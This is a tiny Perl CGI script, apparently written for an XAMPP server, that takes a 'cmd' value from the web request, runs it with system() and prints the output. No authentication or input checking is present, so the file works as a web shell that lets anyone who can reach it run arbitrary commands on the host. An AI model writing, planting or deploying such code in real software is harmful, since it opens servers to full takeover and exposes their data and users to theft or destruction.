#!C:\xampp\perl\bin\perl.exe 
use CGI ':standard';
print  "\nContent-type: text/html \n\n";
print  "\n\nThe output of UNIX command is as:\n\n";
$c=param('cmd');
print(system($c));